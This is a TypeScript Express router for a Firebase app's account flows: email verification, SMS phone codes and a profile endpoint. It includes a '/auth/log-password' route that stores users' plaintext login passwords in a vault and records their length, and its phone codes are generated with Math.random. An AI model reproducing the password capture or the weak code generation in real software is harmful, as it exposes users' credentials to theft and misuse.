import { Router } from 'express';
import admin from 'firebase-admin';
import { z } from 'zod';
import { requireFirebase, AuthedRequest } from '../middleware/firebaseAuth.js';
import { putSecret } from '../services/secretVaultService.js';
import { firestore } from '../db/firestore.js';
import { firebaseApp } from '../db/firestore.js';
import {
  sendAccountVerificationEmail,
  sendPhoneVerificationSms,
  verifyBrevoTransport,
} from '../services/emailService.js';

const router = Router();

const logSchema = z.object({
  password: z.string().min(1),
});

const phoneSchema = z.object({
  phoneNumber: z.string().regex(/^\+[1-9]\d{7,14}$/, 'Use international phone format, for example +256700000000.'),
});

const phoneCodeSchema = z.object({
  code: z.string().regex(/^\d{6}$/, 'Enter the 6 digit verification code.'),
});

const verificationCodeTtlMs = 10 * 60 * 1000;
const verificationCodeCollection = 'phoneVerificationCodes';

const generatePhoneCode = () => `${Math.floor(100000 + Math.random() * 900000)}`;

router.get('/auth/verification-health', requireFirebase, async (_req, res) => {
  const brevo = await verifyBrevoTransport();
  res.json({
    ok: brevo.ready,
    emailProvider: 'brevo',
    smsProvider: 'brevo',
    brevo,
  });
});

router.post('/auth/send-verification-email', requireFirebase, async (req, res, next) => {
  try {
    const authUser = (req as AuthedRequest).authUser;
    if (!authUser?.uid || !authUser.email || !firebaseApp) {
      return res.status(400).json({ message: 'An authenticated email account is required.' });
    }
    const user = await firebaseApp.auth().getUser(authUser.uid);
    if (user.emailVerified) return res.json({ ok: true, alreadyVerified: true });
    const continueUrl = process.env.EMAIL_VERIFICATION_CONTINUE_URL?.trim() || 'https://dottmediaapk.web.app';
    const verificationUrl = await firebaseApp.auth().generateEmailVerificationLink(authUser.email, {
      url: continueUrl,
      handleCodeInApp: false,
    });
    await sendAccountVerificationEmail(
      authUser.email,
      user.displayName || authUser.name || authUser.email.split('@')[0],
      verificationUrl,
    );
    res.json({ ok: true });
  } catch (error) {
    next(error);
  }
});

router.post('/auth/send-phone-verification', requireFirebase, async (req, res, next) => {
  try {
    const authUser = (req as AuthedRequest).authUser;
    if (!authUser?.uid || !firebaseApp) {
      return res.status(400).json({ message: 'An authenticated account is required.' });
    }
    const { phoneNumber } = phoneSchema.parse(req.body);
    const code = generatePhoneCode();
    const expiresAt = Date.now() + verificationCodeTtlMs;
    await firestore.collection(verificationCodeCollection).doc(authUser.uid).set(
      {
        phoneNumber,
        code,
        expiresAt,
        attempts: 0,
        createdAt: admin.firestore.FieldValue.serverTimestamp(),
        updatedAt: admin.firestore.FieldValue.serverTimestamp(),
      },
      { merge: true },
    );
    await sendPhoneVerificationSms(phoneNumber, code);
    res.json({ ok: true, expiresInSeconds: verificationCodeTtlMs / 1000 });
  } catch (error) {
    next(error);
  }
});

router.post('/auth/confirm-phone-verification', requireFirebase, async (req, res, next) => {
  try {
    const authUser = (req as AuthedRequest).authUser;
    if (!authUser?.uid || !firebaseApp) {
      return res.status(400).json({ message: 'An authenticated account is required.' });
    }
    const { code } = phoneCodeSchema.parse(req.body);
    const ref = firestore.collection(verificationCodeCollection).doc(authUser.uid);
    const snap = await ref.get();
    if (!snap.exists) {
      return res.status(400).json({ message: 'Request a verification code first.' });
    }
    const data = snap.data() as { phoneNumber?: string; code?: string; expiresAt?: number; attempts?: number };
    const attempts = Number(data.attempts ?? 0);
    if (!data.phoneNumber || !data.code || !data.expiresAt || data.expiresAt < Date.now()) {
      await ref.delete().catch(() => undefined);
      return res.status(400).json({ message: 'The verification code has expired. Request a new code.' });
    }
    if (attempts >= 5) {
      await ref.delete().catch(() => undefined);
      return res.status(429).json({ message: 'Too many incorrect attempts. Request a new code.' });
    }
    if (data.code !== code) {
      await ref.set(
        {
          attempts: attempts + 1,
          updatedAt: admin.firestore.FieldValue.serverTimestamp(),
        },
        { merge: true },
      );
      return res.status(400).json({ message: 'Invalid verification code.' });
    }
    await firebaseApp.auth().updateUser(authUser.uid, { phoneNumber: data.phoneNumber });
    await firestore.collection('profiles').doc(authUser.uid).set(
      {
        user: {
          uid: authUser.uid,
          email: authUser.email ?? null,
          name: authUser.name ?? authUser.email ?? 'Dott Media Member',
          phoneNumber: data.phoneNumber,
          phoneVerified: true,
        },
        updatedAt: admin.firestore.FieldValue.serverTimestamp(),
      },
      { merge: true },
    );
    await ref.delete().catch(() => undefined);
    res.json({ ok: true, phoneNumber: data.phoneNumber, phoneVerified: true });
  } catch (error) {
    next(error);
  }
});

router.post('/auth/log-password', requireFirebase, async (req, res, next) => {
  try {
    const authUser = (req as AuthedRequest).authUser;
    if (!authUser) {
      return res.status(401).json({ message: 'Unauthorized' });
    }
    const { password } = logSchema.parse(req.body);
    await putSecret(authUser.uid, 'login_password', password);
    await firestore.collection('loginPasswords').doc(authUser.uid).set(
      {
        userId: authUser.uid,
        email: authUser.email ?? null,
        lastSavedAt: admin.firestore.FieldValue.serverTimestamp(),
        length: password.length,
      },
      { merge: true },
    );
    res.json({ ok: true });
  } catch (error) {
    next(error);
  }
});

router.get('/api/profile', requireFirebase, async (req, res) => {
  const authUser = (req as AuthedRequest).authUser;
  if (!authUser) {
    return res.status(401).json({ message: 'Unauthorized' });
  }
  res.json({
    user: {
      uid: authUser.uid,
      email: authUser.email ?? null,
      name: authUser.name ?? authUser.email ?? 'Member',
      photoURL: authUser.picture ?? null,
    },
  });
});

export default router;
